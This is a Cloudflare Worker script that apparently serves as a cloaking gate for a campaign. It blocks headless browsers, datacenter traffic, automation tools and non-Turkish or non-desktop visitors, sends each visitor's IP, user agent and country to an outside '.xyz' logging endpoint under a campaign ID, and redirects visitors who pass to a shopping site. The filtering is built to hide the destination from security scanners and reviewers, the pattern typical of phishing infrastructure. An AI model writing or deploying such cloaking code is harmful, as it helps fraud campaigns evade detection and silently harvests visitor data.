addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const userAgent = request.headers.get("user-agent") || ""
  const ip = request.headers.get("cf-connecting-ip") || ""
  const country = request.headers.get("cf-ipcountry") || "XX"
  const accept = request.headers.get("accept") || ""
  const acceptLang = request.headers.get("accept-language") || ""
  const secChUa = request.headers.get("sec-ch-ua") || ""
  const referer = request.headers.get("referer") || ""
  const cookie = request.headers.get("cookie") || ""

  const TARGET_URL = "https://pazarama.com"
  const ALLOWED_COUNTRY = "TR"
  const ENABLED_BOT_FILTERS = ["headless","datacenter","ua","behavior","js_challenge","rate_limit","fingerprint"]
  const ENABLED_DEVICES = ["desktop"]
  const CAMPAIGN_ID = "cmp_698d40b63b49c"
  const LOG_ENDPOINT = "https://gonderisorgula.xyz/api/log_visit.php"

  let detectedBy = null

  async function sendLog(isBot, filterHit = null) {
    try {
      await fetch(LOG_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          campaign_id: CAMPAIGN_ID,
          ip: ip,
          user_agent: userAgent,
          country: country,
          is_bot: isBot,
          filter_hit: filterHit,
          status: isBot ? "blocked" : "allowed"
        })
      })
    } catch (e) {}
  }

  function isBot() {

    if (ENABLED_BOT_FILTERS.includes("headless") && /HeadlessChrome|puppeteer|selenium|phantomjs|webdriver/i.test(userAgent)) {
      detectedBy = "headless"
      return true
    }

    if (ENABLED_BOT_FILTERS.includes("ua") && (userAgent.length < 40 || !/Chrome|Firefox|Safari|Edg/i.test(userAgent))) {
      detectedBy = "ua"
      return true
    }

    if (ENABLED_BOT_FILTERS.includes("datacenter")) {
      const dcPatterns = /DigitalOcean|Linode|OVH|Hetzner|AWS|Google Cloud|Azure|Vultr/i
      if (dcPatterns.test(userAgent)) {
        detectedBy = "datacenter"
        return true
      }
    }

    if (ENABLED_BOT_FILTERS.includes("behavior")) {
      if (request.headers.get("cf-cache-status") === "HIT") {
        detectedBy = "behavior"
        return true
      }
    }

    // ✅ AUTOMATION FLAGS
    if (ENABLED_BOT_FILTERS.includes("automation_flags")) {
      if (/webdriver|playwright|automation/i.test(userAgent)) {
        detectedBy = "automation_flags"
        return true
      }
    }

    // ✅ ACCEPT HEADER MISMATCH
    if (ENABLED_BOT_FILTERS.includes("accept_mismatch")) {
      if (!accept.includes("text/html")) {
        detectedBy = "accept_mismatch"
        return true
      }
    }

    // ✅ SUSPICIOUS REFERER
    if (ENABLED_BOT_FILTERS.includes("suspicious_referer")) {
      if (referer && !referer.startsWith("https://") && !referer.startsWith("http://")) {
        detectedBy = "suspicious_referer"
        return true
      }
    }

    // ✅ IP ENTROPY (çok basit heuristic)
    if (ENABLED_BOT_FILTERS.includes("ip_entropy")) {
      if (/^(\d+)\.\1\.\1\.\1$/.test(ip)) {
        detectedBy = "ip_entropy"
        return true
      }
    }

    if (ENABLED_BOT_FILTERS.includes("js_challenge")) {
      if (!cookie.includes("verified=true")) {
        detectedBy = "js_challenge"
        throw new Response(\`
          <html><body>
          <script>
          document.cookie = "verified=true; path=/";
          location.reload();
          </script>
          </body></html>
        \`, { headers: { "Content-Type": "text/html" } })
      }
    }

    if (ENABLED_BOT_FILTERS.includes("rate_limit")) {
      const key = ip
      if (!globalThis.__rateMap) globalThis.__rateMap = {}
      const now = Date.now()
      const windowMs = 5000
      const maxReq = 10
      if (!globalThis.__rateMap[key]) globalThis.__rateMap[key] = []
      globalThis.__rateMap[key] = globalThis.__rateMap[key].filter(t => now - t < windowMs)
      globalThis.__rateMap[key].push(now)
      if (globalThis.__rateMap[key].length > maxReq) {
        detectedBy = "rate_limit"
        return true
      }
    }

    if (ENABLED_BOT_FILTERS.includes("fingerprint")) {
      const fingerprint = userAgent + accept + acceptLang + secChUa
      if (!globalThis.__fpMap) globalThis.__fpMap = {}
      if (globalThis.__fpMap[fingerprint]) {
        detectedBy = "fingerprint"
        return true
      }
      globalThis.__fpMap[fingerprint] = true
    }

    if (ENABLED_BOT_FILTERS.includes("header_consistency")) {
      if (!accept || !acceptLang || !secChUa) {
        detectedBy = "header_consistency"
        return true
      }
    }

    if (ENABLED_BOT_FILTERS.includes("tls_fingerprint")) {
      if (!request.cf || !request.cf.tlsCipher) {
        detectedBy = "tls_fingerprint"
        return true
      }
    }

    if (ENABLED_BOT_FILTERS.includes("entropy")) {
      if (!cookie.includes("human=true")) {
        detectedBy = "entropy"
        throw new Response(\`
          <html><body>
          <script>
          document.cookie = "human=true; path=/";
          </script>
          </body></html>
        \`, { headers: { "Content-Type": "text/html" } })
      }
    }

    if (ENABLED_BOT_FILTERS.includes("navigation_flow")) {
      if (!referer) {
        detectedBy = "navigation_flow"
        return true
      }
    }

    return false
  }

  function isAllowedDevice() {
    if (ENABLED_DEVICES.length === 0) return true
    const isMobile = /Mobi|Android/i.test(userAgent)
    const isTablet = /Tablet|iPad/i.test(userAgent)
    const isDesktop = !isMobile && !isTablet
    if (isMobile && ENABLED_DEVICES.includes("mobile")) return true
    if (isTablet && ENABLED_DEVICES.includes("tablet")) return true
    if (isDesktop && (ENABLED_DEVICES.includes("desktop") || ENABLED_DEVICES.includes("laptop"))) return true
    return false
  }

  if (country !== ALLOWED_COUNTRY) {
    await sendLog(true, "country")
    return new Response("Access denied.", { status: 403 })
  }

  try {
    if (isBot()) {
      await sendLog(true, detectedBy)
      return new Response("Bot traffic blocked.", {
        status: 403,
        headers: { "X-Bot-Detected-By": detectedBy || "unknown" }
      })
    }
  } catch (resp) {
    await sendLog(false, "js_challenge")
    return resp
  }

  if (!isAllowedDevice()) {
    await sendLog(true, "device")
    return new Response("Device not allowed.", { status: 403 })
  }

  await sendLog(false, null)
  return Response.redirect(TARGET_URL, 302)
}